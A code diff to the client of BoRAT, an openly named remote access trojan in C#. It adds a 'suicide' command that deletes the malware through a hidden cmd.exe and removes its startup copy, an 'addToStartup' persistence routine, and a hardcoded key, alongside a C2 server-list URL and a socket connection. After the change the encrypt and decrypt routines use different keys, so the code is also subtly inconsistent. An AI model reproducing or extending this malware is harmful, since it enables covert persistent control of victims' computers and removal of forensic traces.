@@ -17,19 +17,16 @@ namespace BoRAT.Client
 {
     public partial class frmMain : Form
     {
-        /*
-         * Change this!!!
-         */
-
+        // Change this
         private readonly string serverList = "https://borat-admin.github.io/site/serverList.txt";
+        private string encryptionKey = "B0R@t2!02@2^2%2#";
 
-        // Internal sockets
+        // Networking
         private IPAddress _ip;
         private int _port, _delay;
-
         private Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-        // Remote File Manager
+        // File Manager
         private bool isFileUpload { get; set; }
         private int fupSize;
         private string fdl_location = "";
@@ -313,7 +310,7 @@ namespace BoRAT.Client
 
                     else
                     {
-                        SendError("commandFaild\n");
+                        SendError("commandFailed\n");
                     }
                 }
 
@@ -444,9 +441,55 @@ namespace BoRAT.Client
                 {
                     isRdpStop = true;
                 }
+
+                else if (command.Equals("suicide"))
+                {
+                    // Send a message back.
+                    SendCommand("suicide~success");
+
+                    // Start a new command prompt to delete the file.
+                    Process.Start(new ProcessStartInfo()
+                    {
+                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                        FileName = "cmd.exe"
+                    });
+
+                    // Delete from startup.
+                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName);
+
+                    // Quit the program.
+                    Environment.Exit(1);
+                }
+
+                else if (command.Equals("addToStartup"))
+                {
+                    // Copy application to startup.
+                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName);
+
+                    // Send a message back.
+                    SendCommand("addToStartup~success");
+
+                    // Start a new command prompt to delete the file.
+                    Process.Start(new ProcessStartInfo()
+                    {
+                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                        FileName = "cmd.exe"
+                    });
+
+                    // Start the new one.
+                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName);
+
+                    // Quit the program.
+                    Environment.Exit(1);
+                }
             }
             catch (Exception ex)
             {
+                // Write the error to the console.
                 Console.WriteLine("INTERNAL ERROR:\n" + ex);
             }
         }
@@ -678,11 +721,11 @@ namespace BoRAT.Client
 
         public string Encrypt(string clearText)
         {
-            var EncryptionKey = "BoRAT_2022";
+            var encryptionKey = "BoRAT_2022";
             var clearBytes = Encoding.Unicode.GetBytes(clearText);
             using (var encryptor = Rijndael.Create())
             {
-                var pdb = new Rfc2898DeriveBytes(EncryptionKey,
+                var pdb = new Rfc2898DeriveBytes(encryptionKey,
                     new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                 encryptor.Key = pdb.GetBytes(32);
                 encryptor.IV = pdb.GetBytes(16);
@@ -706,11 +749,10 @@ namespace BoRAT.Client
         {
             try
             {
-                var EncryptionKey = "BoRAT_2022";
                 var cipherBytes = Convert.FromBase64String(cipherText);
                 using (var encryptor = Rijndael.Create())
                 {
-                    var pdb = new Rfc2898DeriveBytes(EncryptionKey,
+                    var pdb = new Rfc2898DeriveBytes(encryptionKey,
                         new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                     encryptor.Key = pdb.GetBytes(32);
                     encryptor.IV = pdb.GetBytes(16);
